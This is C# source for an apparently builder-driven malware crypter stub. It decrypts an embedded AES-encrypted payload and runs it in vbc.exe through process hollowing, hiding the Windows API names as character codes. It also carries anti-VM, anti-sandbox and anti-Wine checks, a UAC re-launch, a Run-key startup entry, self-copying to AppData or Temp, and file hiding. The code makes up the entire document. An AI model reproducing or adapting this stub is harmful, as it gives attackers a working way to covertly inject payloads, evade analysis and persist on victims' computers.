using System;
using System.Collections.Generic;
using System.Data;
using System.Drawing;
using System.Diagnostics;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;
using System.Resources;
using System.Security.Cryptography;
using System.Reflection;
using Microsoft.Win32;
using System.Security.Principal;
using System.Net;
using System.Management;

[assembly: AssemblyTitle("[assemblytitle]")]
[assembly: AssemblyDescription("[assemblyinfo]")]
[assembly: AssemblyCompany("[assemblycorp]")]
[assembly: AssemblyProduct("[assemblyproduct]")]
[assembly: AssemblyCopyright("[assemblycopyright]")]
[assembly: AssemblyTrademark("[assemblytrademark]")]
[assembly: AssemblyVersionAttribute("[assemblyversion]")]
[assembly: AssemblyFileVersionAttribute("[assemblyfileversion]")]

static class Program
{
    [STAThread]
    static void Main()
    {
        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(false);
        Application.Run(new PG());
    }
}

class RX
{
	[DllImport("kernel32.dll")]
	static extern IntPtr GetModuleHandle(string module);
	[DllImport( "kernel32.dll", SetLastError=true )]
	static extern IntPtr FindResource(IntPtr hModule, string lpName, string lpType);
	[DllImport("kernel32.dll", SetLastError=true)]
	static extern IntPtr LoadResource(IntPtr hModule, IntPtr hResInfo);
	[DllImport("kernel32.dll", SetLastError=true)]
	static extern uint SizeofResource(IntPtr hModule, IntPtr hResInfo); 

	public static byte[] RM()
	{
        ResourceManager Manager = new ResourceManager("Encrypted", Assembly.Load(File.ReadAllBytes(Application.ExecutablePath)));
		    byte[] bytes = (byte[])Manager.GetObject("encfile");
        return bytes;
	}
}

public partial class PG : Form
{
    static bool waited = false;

    private void InitializeComponent()
    {
        this.SuspendLayout();
        this.FormBorderStyle = FormBorderStyle.None;
        this.ShowInTaskbar = false;
        this.ResumeLayout(false);
        this.Visible = false;
        this.WindowState = FormWindowState.Minimized;

        bool dBool = false;
        if(dBool){
          System.Timers.Timer dTimer = new System.Timers.Timer();
          dTimer.Interval = (1000) * (1);
          dTimer.Elapsed += delayTimer_Elapsed;
          dTimer.Enabled = true;
          dTimer.Start();
          while(!waited){}
        } 
        bool pBool = false;
        if(pBool){
          this.FormClosing += Closing;
        }
    }

    void delayTimer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
    {
        waited = true;
    }

    void Closing(object sender, FormClosingEventArgs e)
    {
       Process.Start(Application.ExecutablePath);
    }
    
    public PG()
    {
		    InitializeComponent();
        string injectionType = "[injectionType]";
        string injectionPath = "";
        switch(injectionType.ToLower()){
            case "notepad.exe":
                injectionPath = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "vbc.exe");//@"C:\Windows\System32\notepad.exe";
                break;

            case "vbc.exe":
                injectionPath = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "vbc.exe");
                break;

            case "default browser":
                injectionPath = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "vbc.exe");//BrowserPath();
                break;

            default:
                injectionPath = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "vbc.exe");
                break;
        }
        
        bool adminonly = [adminonly];
        bool msgbox = [msgbox];
        bool startup = [startup-replace];
        bool hide = [hide-replace];
        string storagemethod = "[storage-replace]";
        bool downloader = [downloader-replace];
        bool detectVM = [detectVM];
        bool detectSandboxie = [detectSandboxie];

        if(detectVM)
        {
            if(IsVM())
            {
                MessageBox.Show("This process does not support VMs!", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Process.GetCurrentProcess().Kill();
            }
        }

        if(detectSandboxie)
        {
            if(IsSandbox(Application.ExecutablePath))
            {
                MessageBox.Show("This process does not support Sandboxes!", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Process.GetCurrentProcess().Kill();
            }
        }
        
        if(adminonly){
            if(!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)){
                ProcessStartInfo pInfo = new ProcessStartInfo();
                pInfo.FileName = Application.ExecutablePath;
                pInfo.Verb = "runas";
                Process.Start(pInfo);
                Process.GetCurrentProcess().Kill();
            }
        }

        if(downloader)
        {
            string url = "[downloaderurl]";
            /*WebClient webClient = new WebClient();
            webClient.DownloadFile(new Uri(url), "dl" + System.AppDomain.CurrentDomain.FriendlyName);
            System.IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "dl" + System.AppDomain.CurrentDomain.FriendlyName);
            System.IO.File.Move("dl" + System.AppDomain.CurrentDomain.FriendlyName, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "dl" + System.AppDomain.CurrentDomain.FriendlyName);
            FileInfo Info = new FileInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "dl" + System.AppDomain.CurrentDomain.FriendlyName);
            Info.Attributes = FileAttributes.Hidden; 
            System.Diagnostics.Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "dl" + System.AppDomain.CurrentDomain.FriendlyName);*/
        }
        
        if(msgbox){
            MessageBoxIcon icon;

            switch("[msgboxicon]"){
                case "info":
                    icon = MessageBoxIcon.Information;
                    break;
                    
                case "error":
                    icon = MessageBoxIcon.Error;
                    break;

                case "warning":
                    icon = MessageBoxIcon.Warning;
                    break;

                case "none":
                    icon = MessageBoxIcon.None;
                    break;

                default:
                    icon = MessageBoxIcon.None;
                    break;
            }

            MessageBox.Show("[msgboxbody]", "[msgboxtitle]", MessageBoxButtons.OK, icon);
        }
		    byte[] filebytes = null;

        filebytes = RX.RM();

		    filebytes = AESDecrypt(filebytes, "[key-replace]");
		    IX.AA(filebytes, injectionPath);

        string installpath = "[installpath]";
        
        if(installpath == "%appdata%"){ installpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + System.AppDomain.CurrentDomain.FriendlyName; }
        if(installpath == "%tmp%"){ installpath = Path.GetTempPath() + System.AppDomain.CurrentDomain.FriendlyName; }
        
        if (!File.Exists(installpath))
        {
            File.Copy(Application.ExecutablePath, installpath);
        }
        
    		if (startup)
    			AddToStartup(installpath);

    		if (hide)
    			HideFile();
	}
    
  public static bool IsSandbox(string startupPath)
  {

      StringBuilder username = new StringBuilder();
      Int32 nSize = 50;
      GetUserName(username, ref nSize);

      if ((int)GetModuleHandle("SbieDLL.dll") != 0)
          return true;

      switch (username.ToString().ToUpper())
      {
          case "USER": return true;
          case "SANDBOX": return true;
          case "VIRUS": return true;
          case "MALWARE": return true;
          case "SCHMIDTI": return true;
          case "CURRENTUSER": return true;
      }

      string sPath = startupPath.ToUpper();

      if (sPath == "C:\\FILE.EXE")
          return true;

      if (sPath.Contains("\\VIRUS"))
          return true;

      if (sPath.Contains("SANDBOX"))
          return true;

      if (sPath.Contains("SAMPLE"))
          return true;

      if ((int)FindWindow("Afx:400000:0", (IntPtr)0) != 0)
          return true;

      return false;
  }

  [DllImport("advapi32.dll", SetLastError = true)]
  public static extern bool GetUserName(StringBuilder sb, ref Int32 length);

  [DllImport("kernel32.dll")]
  public static extern IntPtr GetModuleHandle(string lpModuleName);

  [DllImport("user32.dll", SetLastError = true)]
  static extern IntPtr FindWindow(string lpClassName, IntPtr ZeroOnly);

  [DllImport("kernel32.dll")]
  extern public static IntPtr GetProcAddress(IntPtr hModule, string procedureName);

  [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  public static extern uint GetFileAttributes(string lpFileName);


  public static bool IsVM()
      {

      if (regGet("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VBOX")) { return true; }
      if (regGet("HARDWARE\\Description\\System", "SystemBiosVersion").ToUpper().Contains("VBOX")) { return true; }
      if (regGet("HARDWARE\\Description\\System", "VideoBiosVersion").ToUpper().Contains("VIRTUALBOX")) { return true; }
      if (regGet("SOFTWARE\\Oracle\\VirtualBox Guest Additions", "") == "noValueButYesKey") { return true; }
      if (GetFileAttributes("C:\\WINDOWS\\system32\\drivers\\VBoxMouse.sys") != (uint)4294967295) { return true; }

      if (regGet("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VMWARE")) { return true; }
      if (regGet("SOFTWARE\\VMware, Inc.\\VMware Tools", "") == "noValueButYesKey") { return true; }
      if (regGet("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 1\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VMWARE")) { return true; }
      if (regGet("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 2\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VMWARE")) { return true; }
      if (regGet("SYSTEM\\ControlSet001\\Services\\Disk\\Enum", "0").ToUpper().Contains("vmware".ToUpper())) { return true; }
      if (regGet("SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000", "DriverDesc").ToUpper().Contains("VMWARE")) { return true; }
      if (regGet("SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\Settings", "Device Description").ToUpper().Contains("VMWARE")) { return true; }
      if (regGet("SOFTWARE\\VMware, Inc.\\VMware Tools", "InstallPath").ToUpper().Contains("C:\\PROGRAM FILES\\VMWARE\\VMWARE TOOLS\\")) { return true; }
      if (GetFileAttributes("C:\\WINDOWS\\system32\\drivers\\vmmouse.sys") != (uint)4294967295) { return true; }
      if (GetFileAttributes("C:\\WINDOWS\\system32\\drivers\\vmhgfs.sys") != (uint)4294967295) { return true; }

      // Detected whine
      if (GetProcAddress((IntPtr)GetModuleHandle("kernel32.dll"), "wine_get_unix_file_name") != (IntPtr)0) { return true;  }

      if (regGet("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("QEMU")) { return true; }
      if (regGet("HARDWARE\\Description\\System", "SystemBiosVersion").ToUpper().Contains("QEMU")) { return true; }

      ManagementScope scope = new ManagementScope("\\\\.\\ROOT\\cimv2");
      ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_VideoController");
      ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
      ManagementObjectCollection queryCollection = searcher.Get();
      foreach (ManagementObject m in queryCollection)
      {
      if (m["Description"].ToString() == "VM Additions S3 Trio32/64") { return true; }
      if (m["Description"].ToString() == "S3 Trio32/64") { return true; }
      if (m["Description"].ToString() == "VirtualBox Graphics Adapter") { return true; }
      if (m["Description"].ToString() == "VMware SVGA II") {return true; }
      if (m["Description"].ToString().ToUpper().Contains("VMWARE")) {return true; }
      if (m["Description"].ToString() == "") {  return true; }
      }

      return false;
      }

      public static string regGet(string key, string value)
      {
      RegistryKey registryKey;
      registryKey = Registry.LocalMachine.OpenSubKey(key, false);
      if (registryKey != null)
      {
      object rkey = registryKey.GetValue(value, (object)(string)"noValueButYesKey");
      if (rkey.GetType() == typeof(string))
      {
      return rkey.ToString();
      }
      if (registryKey.GetValueKind(value) == RegistryValueKind.String || registryKey.GetValueKind(value) == RegistryValueKind.ExpandString)
      {
      return rkey.ToString();
      }
      if (registryKey.GetValueKind(value) == RegistryValueKind.DWord)
      {
      return Convert.ToString((Int32)rkey);
      }
      if (registryKey.GetValueKind(value) == RegistryValueKind.QWord)
      {
      return Convert.ToString((Int64)rkey);
      }
      if (registryKey.GetValueKind(value) == RegistryValueKind.Binary)
      {
      return Convert.ToString((byte[])rkey);
      }
      if (registryKey.GetValueKind(value) == RegistryValueKind.MultiString)
      {
      return string.Join("", (string[])rkey);
      }
      return "noValueButYesKey";
      }

      return "noKey";
      }
    
	public static byte[] AESDecrypt(byte[] input, string Pass)
	{
		System.Security.Cryptography.RijndaelManaged AES = new System.Security.Cryptography.RijndaelManaged();
		byte[] hash = new byte[32];
		byte[] temp = new MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.ASCII.GetBytes(Pass));
		Array.Copy(temp, 0, hash, 0, 16);
		Array.Copy(temp, 0, hash, 15, 16);
		AES.Key = hash;
		AES.Mode = System.Security.Cryptography.CipherMode.ECB;
		System.Security.Cryptography.ICryptoTransform DESDecrypter = AES.CreateDecryptor();
		return DESDecrypter.TransformFinalBlock(input, 0, input.Length);
	}
    
	public void AddToStartup(string installpath_)
	{
        if (installpath_ == null || installpath_ == "") { installpath_ = Path.GetTempPath() + System.AppDomain.CurrentDomain.FriendlyName; }
        RegistryKey Key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        Key.SetValue("[startup-name]", installpath_);	
	}
    
	public void HideFile()
	{
        FileInfo Info = new FileInfo(Application.ExecutablePath);
        Info.Attributes = FileAttributes.Hidden;		
	}
}

public class IX
{
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    internal static extern IntPtr LoadLibraryA([In, MarshalAs(UnmanagedType.LPStr)] string lpFileName);
    [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    delegate bool ESS(string appName, StringBuilder commandLine, IntPtr procAttr, IntPtr thrAttr, [MarshalAs(UnmanagedType.Bool)] bool inherit, int creation, IntPtr env, string curDir, byte[] sInfo, IntPtr[] pInfo);
    delegate bool EXT(IntPtr hThr, uint[] ctxt);
    delegate bool TEX(IntPtr t, uint[] c); //all kernel32
    delegate uint ION(IntPtr hProc, IntPtr baseAddr); //ntdll
    delegate bool ORY(IntPtr hProc, IntPtr baseAddr, ref IntPtr bufr, int bufrSize, ref IntPtr numRead);
    delegate uint EAD(IntPtr hThread); //kernel32.dll
    delegate IntPtr CEX(IntPtr hProc, IntPtr addr, IntPtr size, int allocType, int prot);
    delegate bool CTEX(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flNewProtect, ref uint lpflOldProtect);
    delegate bool MOR(IntPtr hProcess, IntPtr naddr, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten); //kernel32.dll
    delegate bool OP(byte[] bytes, string surrogateProcess);

    public T CreateAPI<T>(string name, string method)
    {
        return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(name), method), typeof(T));
    }

    public static bool AA(byte[] bytes, string surrogateProcess)
    {
        IX p = new IX();
        OP F1 = new OP(p.Q);
        bool Res = F1(bytes, surrogateProcess);
        return true;
    }
    
    public bool Q(byte[] bytes, string surrogateProcess)
    {
        String NTD = Convert.ToString((char)110) + (char)116 + (char)100 + (char)108 + (char)108;
        ESS CP = CreateAPI<ESS>("kernel32", Convert.ToString((char)67) + (char)114 + (char)101 + (char)97 + (char)116 + (char)101 + (char)80 + (char)114 + (char)111 + (char)99 + (char)101 + (char)115 + (char)115 + (char)65);
        ION NUVS = CreateAPI<ION>(NTD, Convert.ToString((char)78) + (char)116 + (char)85 + (char)110 + (char)109 + (char)97 + (char)112 + (char)86 + (char)105 + (char)101 + (char)119 + (char)79 + (char)102 + (char)83 + (char)101 + (char)99 + (char)116 + (char)105 + (char)111 + (char)110);
        EXT GTC = CreateAPI<EXT>("kernel32", Convert.ToString((char)71) + (char)101 + (char)116 + (char)84 + (char)104 + (char)114 + (char)101 + (char)97 + (char)100 + (char)67 + (char)111 + (char)110 + (char)116 + (char)101 + (char)120 + (char)116);
        TEX STC = CreateAPI<TEX>("kernel32", Convert.ToString((char)83) + (char)101 + (char)116 + (char)84 + (char)104 + (char)114 + (char)101 + (char)97 + (char)100 + (char)67 + (char)111 + (char)110 + (char)116 + (char)101 + (char)120 + (char)116);
        ORY RPM = CreateAPI<ORY>("kernel32", Convert.ToString((char)82) + (char)101 + (char)97 + (char)100 + (char)80 + (char)114 + (char)111 + (char)99 + (char)101 + (char)115 + (char)115 + (char)77 + (char)101 + (char)109 + (char)111 + (char)114 + (char)121);
        EAD RT = CreateAPI<EAD>("kernel32", Convert.ToString((char)82) + (char)101 + (char)115 + (char)117 + (char)109 + (char)101 + (char)84 + (char)104 + (char)114 + (char)101 + (char)97 + (char)100);
        CEX VAE = CreateAPI<CEX>("kernel32", Convert.ToString((char)86) + (char)105 + (char)114 + (char)116 + (char)117 + (char)97 + (char)108 + (char)65 + (char)108 + (char)108 + (char)111 + (char)99 + (char)69 + (char)120);
        CTEX VPE = CreateAPI<CTEX>("kernel32", Convert.ToString((char)86) + (char)105 + (char)114 + (char)116 + (char)117 + (char)97 + (char)108 + (char)80 + (char)114 + (char)111 + (char)116 + (char)101 + (char)99 + (char)116 + (char)69 + (char)120);
        MOR WPM = CreateAPI<MOR>("kernel32", Convert.ToString((char)87) + (char)114 + (char)105 + (char)116 + (char)101 + (char)80 + (char)114 + (char)111 + (char)99 + (char)101 + (char)115 + (char)115 + (char)77 + (char)101 + (char)109 + (char)111 + (char)114 + (char)121);
        try
        {
            IntPtr procAttr = IntPtr.Zero;
            IntPtr[] processInfo = new IntPtr[4];
            byte[] startupInfo = new byte[0x44];
            int num2 = BitConverter.ToInt32(bytes, 60);
            int num = BitConverter.ToInt16(bytes, num2 + 6);
            IntPtr ptr4 = new IntPtr(BitConverter.ToInt32(bytes, num2 + 0x54));
            if (CP(null, new StringBuilder(surrogateProcess), procAttr, procAttr, false, 4, procAttr, null, startupInfo, processInfo))
            {
                uint[] ctxt = new uint[0xb3];
                ctxt[0] = 0x10002;
                if (GTC(processInfo[1], ctxt))
                {
                    IntPtr baseAddr = new IntPtr(ctxt[0x29] + 8L);
                    IntPtr buffer = IntPtr.Zero;
                    IntPtr bufferSize = new IntPtr(4);
                    IntPtr numRead = IntPtr.Zero;
                    if (RPM(processInfo[0], baseAddr, ref buffer, (int)bufferSize, ref numRead) && (NUVS(processInfo[0], buffer) == 0))
                    {
                        IntPtr addr = new IntPtr(BitConverter.ToInt32(bytes, num2 + 0x34));
                        IntPtr sz = new IntPtr((Int32)BitConverter.ToUInt32(bytes, num2+80));
                        IntPtr naddr = VAE(processInfo[0], addr, sz, 0x3000, 0x40);

                        int lpNumberOfBytesWritten;
                        WPM(processInfo[0], naddr, bytes, (uint)((int)ptr4), out lpNumberOfBytesWritten);
                        int num5 = num - 1;
                        for (int i = 0; i <= num5; i++)
                        {
                            int[] mzt = new int[10];
                            Buffer.BlockCopy(bytes, (num2 + 0xf8) + (i * 40), mzt, 0, 40);
                            byte[] buffer2 = new byte[(mzt[4] - 1) + 1];
                            Buffer.BlockCopy(bytes, mzt[5], buffer2, Convert.ToInt32(null, 2), buffer2.Length);
                            addr = new IntPtr(buffer2.Length);
                            sz = new IntPtr(naddr.ToInt32() + mzt[3]);
                            WPM(processInfo[0], sz, buffer2, (uint)addr, out lpNumberOfBytesWritten);
                        }
                        
                        sz = new IntPtr(ctxt[0x29] + 8L);
                        addr = new IntPtr(4);
                        int nInt = naddr.ToInt32();
                        byte[] bN = BitConverter.GetBytes(Convert.ToUInt32(nInt));
                        Int64 i6 = addr.ToInt64();
                        uint u = (uint)0;
                        WPM(processInfo[0], sz, bN, u, out lpNumberOfBytesWritten);
                        ctxt[0x2c] = (uint)(naddr.ToInt32() + BitConverter.ToInt32(bytes, num2 + 40));
                        STC(processInfo[1], ctxt);
                    }
                }
                RT(processInfo[1]);
            }
        }
        catch
        {
            return false;
        }
        return true;
    }  
}